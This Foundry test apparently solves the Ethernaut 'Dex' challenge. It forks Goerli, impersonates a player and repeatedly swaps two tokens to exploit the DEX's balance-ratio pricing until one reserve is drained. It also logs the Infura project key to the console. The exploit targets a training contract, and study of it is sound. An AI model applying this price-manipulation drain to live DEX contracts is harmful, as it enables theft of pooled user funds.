// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Dex.sol";
import "../src/SwappableToken.sol";

contract TestAttack is Test {

    string constant public PROJECT_ID = "PROJECT_ID";
    address payable public constant  DEX_ADDR = payable(0xfD2bC3C03756b8ABb8C51c82889BFEBf70c7e91C);
    address payable public constant  PLAYER   = payable(0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18);

    Dex public dexCtr;
    SwappableToken public token1Ctr;
    SwappableToken public token2Ctr;

    function setUp() public {
        fork(9_228_070);

        dexCtr = (Dex)(DEX_ADDR);
        token1Ctr = (SwappableToken)(dexCtr.token1());
        token2Ctr = (SwappableToken)(dexCtr.token2());
    }

    function fork(uint ublock) public {
        string memory infuraId = vm.envString(PROJECT_ID);
        console.log(PROJECT_ID, infuraId);

        string memory url = string.concat("https://goerli.infura.io/v3/", infuraId);
        console.log("URL", url);

        uint goerliFork = vm.createFork(url);
        vm.selectFork(goerliFork);
        vm.rollFork(ublock);
    }

    function _trnAmount(uint256 supply, uint256 rate100, uint256 balance) private pure returns (uint256) {
        if (rate100 * balance <= supply * 100)
            return balance;

        return (supply * 100)/rate100;
    }

    function testShow() public {

        uint token1Supply = token1Ctr.totalSupply();
        uint token2Supply = token2Ctr.totalSupply();
        uint token1Balance = token1Ctr.balanceOf(PLAYER);
        uint token2Balance = token2Ctr.balanceOf(PLAYER);
        bool stop = false;

        console.log("Token1 Supply: ", token1Supply);
        console.log("Token2 Supply: ", token2Supply);

        do {
            uint swap12 = dexCtr.getSwapPrice(address(token1Ctr), address(token2Ctr), 100);
            uint swap21 = dexCtr.getSwapPrice(address(token2Ctr), address(token1Ctr), 100);

            console.log("Token1 Player: ", token1Balance);
            console.log("Token2 Player: ", token2Balance);
            console.log("Swap Rate - Token1:Token2, 100:", swap12);
            console.log("Swap Rate - Token2:Token1, 100:", swap21);

            if (swap12 >= swap21) {
                uint amnt = _trnAmount(token1Supply,swap12,token1Balance);
                stop = amnt != token1Balance;

                console.log("Swapping Token1->Token2: ", amnt);

                vm.prank(PLAYER);
                token1Ctr.approve(PLAYER, DEX_ADDR, amnt);

                vm.prank(PLAYER);
                dexCtr.swap(address(token1Ctr), address(token2Ctr), amnt);
            }
            else {
                uint amnt = _trnAmount(token2Supply,swap21,token2Balance);
                stop = amnt != token2Balance;

                console.log("Swapping Token2->Token1: ", amnt);

                vm.prank(PLAYER);
                token2Ctr.approve(PLAYER, DEX_ADDR, amnt);

                vm.prank(PLAYER);
                dexCtr.swap(address(token2Ctr), address(token1Ctr), amnt);
            }

            token1Balance = token1Ctr.balanceOf(PLAYER);
            token2Balance = token2Ctr.balanceOf(PLAYER);

            console.log("=====================================================");
            console.log("");
        } while(!stop && (token1Balance < token1Supply) && (token2Balance < token2Supply));

        console.log("Token1 Player: ", token1Balance);
        console.log("Token2 Player: ", token2Balance);
    }
}